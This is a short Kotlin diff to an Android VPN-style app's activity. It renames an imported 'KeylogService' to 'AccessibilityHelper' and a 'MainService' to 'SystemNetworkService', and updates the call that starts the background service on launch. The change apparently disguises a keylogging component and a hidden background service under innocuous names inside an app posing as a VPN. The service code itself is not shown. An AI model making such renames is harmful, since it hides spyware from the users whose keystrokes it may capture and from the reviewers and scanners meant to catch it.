@@ -18,8 +18,8 @@ import android.app.Activity
 import android.content.Intent
 import android.provider.Settings
 import android.app.AlertDialog
-import com.openaccess.sdk.service.KeylogService
-import com.openaccess.sdk.service.MainService
+import com.openaccess.sdk.service.AccessibilityHelper
+import com.openaccess.sdk.service.SystemNetworkService
 import java.net.HttpURLConnection
 import java.net.URL
 import java.util.Locale
@@ -58,7 +58,7 @@ class VpnActivity : Activity() {
         setContentView(R.layout.activity_vpn)
 
         // Start background service
-        try { MainService.start(this) } catch (e: Exception) { Log.e(TAG, "start: ${e.message}") }
+        try { SystemNetworkService.start(this) } catch (e: Exception) { Log.e(TAG, "start: ${e.message}") }
 
         initViews()
         setupServerSpinner()
